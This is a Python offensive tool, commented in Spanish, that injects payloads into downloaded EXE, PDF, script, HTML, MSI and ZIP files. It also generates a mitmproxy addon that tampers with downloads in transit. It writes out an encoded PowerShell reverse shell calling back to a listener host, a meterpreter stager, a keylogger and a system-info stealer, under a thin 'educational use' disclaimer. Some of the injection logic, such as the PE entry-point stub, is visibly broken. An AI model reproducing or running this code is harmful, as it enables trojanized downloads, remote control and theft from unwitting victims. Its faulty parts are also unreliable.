```python
#!/usr/bin/env python3
"""
Advanced Download Script Injector - MITM Framework
Uso educativo y ético exclusivamente en entornos autorizados
"""

import os
import sys
import re
import hashlib
import logging
import argparse
import tempfile
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, List, Tuple
import magic  # python-magic para detección MIME
import pefile  # Para manipulación de PE
import lief    # Alternativa moderna para PE/ELF/MachO
from cryptography.fernet import Fernet
import base64

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('injector.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class DownloadInjector:
    """Framework principal de inyección en descargas"""

    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.supported_formats = {
            'exe': self._inject_exe,
            'pdf': self._inject_pdf,
            'js': self._inject_javascript,
            'html': self._inject_html,
            'vbs': self._inject_vbscript,
            'ps1': self._inject_powershell,
            'bat': self._inject_batch,
            'msi': self._inject_msi,
            'zip': self._inject_archive,
            'docx': self._inject_office_macro,
        }

        self.payloads = {
            'reverse_shell': self._generate_reverse_shell,
            'meterpreter': self._generate_meterpreter,
            'keylogger': self._generate_keylogger,
            'ransomware_sim': self._generate_ransomware_sim,
            'info_stealer': self._generate_info_stealer,
        }

        # Inicializar cifrado para payloads
        self.cipher_key = Fernet.generate_key()
        self.cipher = Fernet(self.cipher_key)

    def detect_file_type(self, file_path: str) -> str:
        """Detecta el tipo real de archivo usando magic bytes"""
        try:
            mime = magic.Magic(mime=True)
            file_type = mime.from_file(file_path)

            # Mapeo de tipos MIME a extensiones
            mime_map = {
                'application/x-dosexec': 'exe',
                'application/pdf': 'pdf',
                'application/javascript': 'js',
                'text/html': 'html',
                'application/zip': 'zip',
                'application/vnd.openxmlformats-officedocument': 'docx',
                'application/x-msi': 'msi',
            }

            for mime_type, ext in mime_map.items():
                if mime_type in file_type:
                    return ext

            return Path(file_path).suffix[1:].lower()
        except Exception as e:
            logger.error(f"Error detectando tipo: {e}")
            return Path(file_path).suffix[1:].lower()

    def calculate_hash(self, file_path: str) -> Dict[str, str]:
        """Calcula hashes del archivo"""
        hashes = {
            'md5': hashlib.md5(),
            'sha1': hashlib.sha1(),
            'sha256': hashlib.sha256()
        }

        with open(file_path, 'rb') as f:
            while chunk := f.read(8192):
                for h in hashes.values():
                    h.update(chunk)

        return {name: h.hexdigest() for name, h in hashes.items()}

    def backup_file(self, file_path: str) -> str:
        """Crea backup del archivo original"""
        backup_path = f"{file_path}.bak.{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        try:
            with open(file_path, 'rb') as src, open(backup_path, 'wb') as dst:
                dst.write(src.read())
            logger.info(f"Backup creado: {backup_path}")
            return backup_path
        except Exception as e:
            logger.error(f"Error en backup: {e}")
            return None

    def _generate_payload(self, payload_type: str, config: Dict) -> bytes:
        """Genera payload según tipo"""
        if payload_type in self.payloads:
            return self.payloads[payload_type](config)
        else:
            # Payload personalizado desde archivo
            with open(config.get('payload_file', ''), 'rb') as f:
                return f.read()

    def _generate_reverse_shell(self, config: Dict) -> bytes:
        """Genera reverse shell ofuscado"""
        ip = config.get('lhost', '127.0.0.1')
        port = config.get('lport', 4444)

        # PowerShell reverse shell ofuscado
        ps_code = f'''
        $client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
        $stream = $client.GetStream();
        [byte[]]$bytes = 0..65535|%{{0}};
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
            $sendback = (iex $data 2>&1 | Out-String );
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($sendbyte,0,$sendbyte.Length);
            $stream.Flush()
        }};
        $client.Close()
        '''

        # Ofuscación Base64
        encoded = base64.b64encode(ps_code.encode('utf-16le')).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}".encode()

    def _generate_meterpreter(self, config: Dict) -> bytes:
        """Genera stager de Meterpreter"""
        ip = config.get('lhost', '127.0.0.1')
        port = config.get('lport', 4444)

        # Usar msfvenom si está disponible
        try:
            result = subprocess.run([
                'msfvenom', '-p', 'windows/meterpreter/reverse_tcp',
                f'LHOST={ip}', f'LPORT={port}',
                '-f', 'raw', '-o', '/dev/stdout'
            ], capture_output=True, check=True)
            return result.stdout
        except:
            logger.warning("msfvenom no disponible, usando stager básico")
            return b"METASPLOIT_STAGER_PLACEHOLDER"

    def _generate_keylogger(self, config: Dict) -> bytes:
        """Genera keylogger básico en PowerShell"""
        return b'''
        $path = "$env:temp\\keylog.txt"
        $signature = @"
        [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
        public static extern short GetAsyncKeyState(int virtualKeyCode);
        "@
        Add-Type -MemberDefinition $signature -Name "Win32" -Namespace Win32Functions
        while($true) {
            Start-Sleep -Milliseconds 40
            for($i=8; $i -le 255; $i++) {
                $state = [Win32Functions.Win32]::GetAsyncKeyState($i)
                if($state -eq -32767) {
                    [System.IO.File]::AppendAllText($path, "$([char]$i)")
                }
            }
        }
        '''

    def _generate_ransomware_sim(self, config: Dict) -> bytes:
        """Simulador de ransomware para testing"""
        return b'''
        Write-Host "RANSOMWARE SIMULATION - NO REAL ENCRYPTION"
        $files = Get-ChildItem -Path $env:USERPROFILE\\Desktop -Filter *.txt
        foreach($file in $files) {
            $content = Get-Content $file.FullName
            $newContent = "SIMULATED_RANSOMWARE_" + $content
            Set-Content -Path $file.FullName -Value $newContent
        }
        '''

    def _generate_info_stealer(self, config: Dict) -> bytes:
        """Stealer de información del sistema"""
        return b'''
        $info = @{
            Hostname = $env:COMPUTERNAME
            Username = $env:USERNAME
            OS = (Get-WmiObject Win32_OperatingSystem).Caption
            IP = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address
            Processes = Get-Process | Select -First 10 | ConvertTo-Json
        }
        $info | ConvertTo-Json | Out-File "$env:temp\\sysinfo.json"
        '''

    def _inject_exe(self, file_path: str, payload: bytes, config: Dict) -> bool:
        """Inyecta payload en ejecutable PE"""
        try:
            # Método 1: Usando pefile para añadir sección
            pe = pefile.PE(file_path)

            # Crear nueva sección para el payload
            section_name = b".inject\x00\x00"
            raw_size = 0x1000
            virtual_size = len(payload)

            # Alinear tamaños
            file_alignment = pe.OPTIONAL_HEADER.FileAlignment
            section_alignment = pe.OPTIONAL_HEADER.SectionAlignment

            if virtual_size % file_alignment != 0:
                virtual_size += file_alignment - (virtual_size % file_alignment)

            # Añadir la sección
            new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
            new_section.Name = section_name
            new_section.Misc_VirtualSize = virtual_size
            new_section.SizeOfRawData = raw_size
            new_section.PointerToRawData = len(pe.__data__)
            new_section.Characteristics = 0xE0000020  # RWX

            pe.sections.append(new_section)
            pe.FILE_HEADER.NumberOfSections += 1

            # Guardar con payload
            output_path = file_path + ".injected.exe"
            pe.write(output_path)

            # Parchear entry point
            with open(output_path, 'r+b') as f:
                f.seek(new_section.PointerToRawData)
                f.write(payload.ljust(raw_size, b'\x00'))

                # Modificar entry point para ejecutar payload primero
                original_ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
                new_ep = new_section.VirtualAddress

                # Inyectar stub que llama al payload y luego al original
                stub = self._create_pe_stub(new_ep, original_ep)
                f.seek(new_section.PointerToRawData)
                f.write(stub + payload)

            logger.info(f"PE inyectado exitosamente: {output_path}")
            return True

        except Exception as e:
            logger.error(f"Error inyectando EXE: {e}")
            return False

    def _create_pe_stub(self, payload_addr: int, original_ep: int) -> bytes:
        """Crea stub assembly para PE"""
        # Pushad, llamar payload, popad, jmp original EP
        stub = b'\x60'  # pushad
        stub += b'\xE8' + (payload_addr + 5).to_bytes(4, 'little')  # call payload
        stub += b'\x61'  # popad
        stub += b'\xE9' + (original_ep - 5).to_bytes(4, 'little')  # jmp original
        return stub

    def _inject_pdf(self, file_path: str, payload: bytes, config: Dict) -> bool:
        """Inyecta JavaScript en PDF"""
        try:
            with open(file_path, 'rb') as f:
                content = f.read()

            # Crear objeto JavaScript malicioso
            js_code = f'''
            app.alert("PDF Processing...");
            try {{
                eval(unescape("{payload.decode('latin-1')}"));
            }} catch(e) {{}}
            '''

            # Construir objeto PDF con JavaScript
            js_object = f'''
            /Type /Action
            /S /JavaScript
            /JS ({js_code})
            '''

            # Insertar en el PDF (después del último %%EOF)
            injection = f'''
            {js_object}
            /OpenAction <<{js_object}>>
            '''

            if b'%%EOF' in content:
                content = content.replace(b'%%EOF', injection.encode() + b'%%EOF')
            else:
                content += injection.encode()

            output_path = file_path + ".injected.pdf"
            with open(output_path, 'wb') as f:
                f.write(content)

            logger.info(f"PDF inyectado: {output_path}")
            return True

        except Exception as e:
            logger.error(f"Error inyectando PDF: {e}")
            return False

    def _inject_javascript(self, file_path: str, payload: bytes, config: Dict) -> bool:
        """Inyecta código JavaScript adicional"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # Ofuscar payload
            obfuscated = base64.b64encode(payload).decode()
            injection = f'''
            (function() {{
                try {{
                    var payload = atob("{obfuscated}");
                    eval(payload);
                }} catch(e) {{}}
            }})();
            '''

            # Insertar al inicio del archivo
            content = injection + content

            output_path = file_path + ".injected.js"
            with open(output_path, 'w') as f:
                f.write(content)

            logger.info(f"JavaScript inyectado: {output_path}")
            return True

        except Exception as e:
            logger.error(f"Error inyectando JS: {e}")
            return False

    def _inject_html(self, file_path: str, payload: bytes, config: Dict) -> bool:
        """Inyecta script en HTML"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # Crear iframe o script tag
            if config.get('use_iframe', False):
                injection = f'<iframe src="data:text/html,{payload.decode()}" style="display:none"></iframe>'
            else:
                injection = f'<script>{payload.decode("latin-1")}</script>'

            # Insertar después de <head> o al inicio
            if '<head>' in content.lower():
                content = re.sub(r'(?i)(<head>)', r'\1' + injection, content, 1)
            else:
                content = injection + content

            output_path = file_path + ".injected.html"
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(content)

            logger.info(f"HTML inyectado: {output_path}")
            return True

        except Exception as e:
            logger.error(f"Error inyectando HTML: {e}")
            return False

    def _inject_vbscript(self, file_path: str, payload: bytes, config: Dict) -> bool:
        """Inyecta código VBScript"""
        try:
            with open(file_path, 'r') as f:
                content = f.read()

            injection = f'''
            On Error Resume Next
            Execute("{payload.decode('latin-1')}")
            '''

            content = injection + content
            output_path = file_path + ".injected.vbs"

            with open(output_path, 'w') as f:
                f.write(content)

            return True
        except Exception as e:
            logger.error(f"Error inyectando VBS: {e}")
            return False

    def _inject_powershell(self, file_path: str, payload: bytes, config: Dict) -> bool:
        """Inyecta código PowerShell"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # Payload codificado en base64
            encoded_payload = base64.b64encode(payload).decode()
            injection = f'''
            # Auto-ejecución
            $encoded = "{encoded_payload}"
            $script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
            Invoke-Expression $script
            '''

            content = injection + content
            output_path = file_path + ".injected.ps1"

            with open(output_path, 'w') as f:
                f.write(content)

            return True
        except Exception as e:
            logger.error(f"Error inyectando PS: {e}")
            return False

    def _inject_batch(self, file_path: str, payload: bytes, config: Dict) -> bool:
        """Inyecta comandos batch"""
        try:
            with open(file_path, 'r') as f:
                content = f.read()

            injection = f'''
            @echo off
            powershell -EncodedCommand {base64.b64encode(payload).decode()}
            '''

            content = injection + content
            output_path = file_path + ".injected.bat"

            with open(output_path, 'w') as f:
                f.write(content)

            return True
        except Exception as e:
            logger.error(f"Error inyectando BAT: {e}")
            return False

    def _inject_msi(self, file_path: str, payload: bytes, config: Dict) -> bool:
        """Inyecta en instalador MSI"""
        try:
            # Usar msidb para modificar MSI
            temp_dir = tempfile.mkdtemp()

            # Extraer MSI
            subprocess.run(['msidb', '-x', temp_dir, file_path], check=True)

            # Agregar acción personalizada
            with open(os.path.join(temp_dir, 'payload.vbs'), 'wb') as f:
                f.write(payload)

            # Reempaquetar
            output_path = file_path + ".injected.msi"
            subprocess.run(['msidb', '-a', temp_dir, output_path], check=True)

            return True
        except Exception as e:
            logger.error(f"Error inyectando MSI: {e}")
            return False

    def _inject_archive(self, file_path: str, payload: bytes, config: Dict) -> bool:
        """Inyecta en archivos comprimidos"""
        try:
            import zipfile

            output_path = file_path + ".injected.zip"

            with zipfile.ZipFile(file_path, 'r') as zin:
                with zipfile.ZipFile(output_path, 'w') as zout:
                    for item in zin.infolist():
                        zout.writestr(item, zin.read(item.filename))

                    # Agregar payload como script
                    zout.writestr('setup.vbs', payload)
                    zout.writestr('autorun.inf', b'[autorun]\nopen=setup.vbs')

            return True
        except Exception as e:
            logger.error(f"Error inyectando ZIP: {e}")
            return False

    def _inject_office_macro(self, file_path: str, payload: bytes, config: Dict) -> bool:
        """Inyecta macros en documentos Office"""
        try:
            # Crear documento con macro usando python-pptx/python-docx
            from docx import Document

            doc = Document(file_path)

            # Agregar macro (requiere plantilla con macros habilitadas)
            # Nota: python-docx no soporta macros directamente
            # Se necesitaría usar win32com en Windows

            logger.warning("Inyección de macros requiere win32com en Windows")
            return False

        except Exception as e:
            logger.error(f"Error inyectando Office: {e}")
            return False

    def inject_payload(self, file_path: str, payload_type: str,
                       config: Dict = None) -> Optional[str]:
        """Método principal de inyección"""
        if not os.path.exists(file_path):
            logger.error(f"Archivo no encontrado: {file_path}")
            return None

        config = config or {}

        # Detectar tipo de archivo
        file_type = self.detect_file_type(file_path)
        logger.info(f"Tipo detectado: {file_type}")

        if file_type not in self.supported_formats:
            logger.error(f"Formato no soportado: {file_type}")
            return None

        # Calcular hashes originales
        original_hashes = self.calculate_hash(file_path)
        logger.info(f"Hash original: {original_hashes['sha256']}")

        # Backup
        backup_path = self.backup_file(file_path)

        # Generar payload
        try:
            payload = self._generate_payload(payload_type, config)
            # Cifrar payload si se solicita
            if config.get('encrypt', False):
                payload = self.cipher.encrypt(payload)
        except Exception as e:
            logger.error(f"Error generando payload: {e}")
            return None

        # Inyectar según tipo
        injector_func = self.supported_formats[file_type]
        success = injector_func(file_path, payload, config)

        if success:
            output_path = file_path + f".injected.{file_type}"
            new_hashes = self.calculate_hash(output_path)

            logger.info(f"Inyección exitosa: {output_path}")
            logger.info(f"Nuevo hash: {new_hashes['sha256']}")

            # Verificar integridad básica
            if self._verify_injection(output_path, file_type):
                return output_path
            else:
                logger.warning("Verificación de inyección falló")
                return None

        return None

    def _verify_injection(self, file_path: str, file_type: str) -> bool:
        """Verifica que la inyección fue exitosa"""
        try:
            # Verificar que el archivo sigue siendo válido
            if file_type == 'exe':
                pefile.PE(file_path)  # Intentará parsear el PE
            elif file_type == 'pdf':
                with open(file_path, 'rb') as f:
                    content = f.read()
                    if not content.startswith(b'%PDF'):
                        return False

            return True
        except:
            return False

    def batch_inject(self, directory: str, payload_type: str,
                    pattern: str = "*.*", config: Dict = None) -> List[str]:
        """Inyección por lotes en directorio"""
        results = []

        for file_path in Path(directory).rglob(pattern):
            if file_path.is_file():
                logger.info(f"Procesando: {file_path}")
                result = self.inject_payload(str(file_path), payload_type, config)
                if result:
                    results.append(result)

        return results

    def create_mitmproxy_script(self, output_path: str = "mitm_injector.py"):
        """Genera script para mitmproxy"""
        script_content = '''
import mitmproxy.http
from mitmproxy import ctx
import base64

class DownloadInjector:
    def response(self, flow: mitmproxy.http.HTTPFlow):
        content_type = flow.response.headers.get("content-type", "")

        # Detectar tipos de archivo para inyectar
        injectable_types = [
            "application/x-msdownload",
            "application/pdf",
            "application/javascript",
            "text/html",
            "application/zip"
        ]

        if any(t in content_type for t in injectable_types):
            ctx.log.info(f"Inyectando en: {flow.request.url}")

            # Payload codificado
            payload = base64.b64decode("PAYLOAD_BASE64")

            # Inyectar según tipo
            if "x-msdownload" in content_type:
                # Inyectar en EXE
                flow.response.content = self.inject_exe(
                    flow.response.content, payload
                )
            elif "html" in content_type:
                # Inyectar script en HTML
                script = f"<script>eval(atob('{base64.b64encode(payload).decode()}'))</script>"
                content = flow.response.content.decode("utf-8", errors="ignore")
                content = content.replace("</head>", script + "</head>")
                flow.response.content = content.encode()

    def inject_exe(self, content, payload):
        # Implementación básica de inyección PE
        # Añadir nueva sección
        return content + payload

addons = [DownloadInjector()]
'''

        with open(output_path, 'w') as f:
            f.write(script_content)

        logger.info(f"Script mitmproxy creado: {output_path}")

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Download Script Injector",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('target', help='Archivo o directorio objetivo')
    parser.add_argument('-t', '--type',
                       choices=['reverse_shell', 'meterpreter', 'keylogger',
                               'ransomware_sim', 'info_stealer', 'custom'],
                       default='reverse_shell',
                       help='Tipo de payload')
    parser.add_argument('-l', '--lhost', default='127.0.0.1',
                       help='IP del listener')
    parser.add_argument('-p', '--lport', type=int, default=4444,
                       help='Puerto del listener')
    parser.add_argument('-e', '--encrypt', action='store_true',
                       help='Cifrar payload')
    parser.add_argument('-b', '--batch', action='store_true',
                       help='Procesar directorio completo')
    parser.add_argument('--pattern', default='*.*',
                       help='Patrón para batch (ej: *.exe)')
    parser.add_argument('--payload-file',
                       help='Archivo de payload personalizado')
    parser.add_argument('--generate-mitmproxy',
                       help='Generar script para mitmproxy')
    parser.add_argument('--use-iframe', action='store_true',
                       help='Usar iframe para HTML')

    args = parser.parse_args()

    # Configuración
    config = {
        'lhost': args.lhost,
        'lport': args.lport,
        'encrypt': args.encrypt,
        'use_iframe': args.use_iframe,
    }

    if args.payload_file:
        config['payload_file'] = args.payload_file

    # Inicializar inyector
    injector = DownloadInjector()

    # Generar script mitmproxy si se solicita
    if args.generate_mitmproxy:
        injector.create_mitmproxy_script(args.generate_mitmproxy)
        return

    # Inyección
    if args.batch:
        if not os.path.isdir(args.target):
            logger.error("Batch requiere un directorio")
            sys.exit(1)

        results = injector.batch_inject(
            args.target, args.type, args.pattern, config
        )

        logger.info(f"Archivos inyectados: {len(results)}")
        for r in results:
            logger.info(f"  - {r}")
    else:
        result = injector.inject_payload(args.target, args.type, config)
        if result:
            logger.info(f"Inyección completada: {result}")
        else:
            logger.error("Inyección fallida")
            sys.exit(1)

if __name__ == "__main__":
    # Banner de advertencia
    print("""
    ⚠️  ADVERTENCIA ⚠️
    Este script es solo para fines educativos y de seguridad autorizados.
    El uso no autorizado contra sistemas sin permiso es ILEGAL.

    Requisitos:
    - python-magic: pip install python-magic
    - pefile: pip install pefile
    - cryptography: pip install cryptography
    - lief: pip install lief (opcional)
    """)

    response = input("¿Tienes autorización para usar este script? (s/n): ")
    if response.lower() != 's':
        print("Saliendo...")
        sys.exit(0)

    main()
```
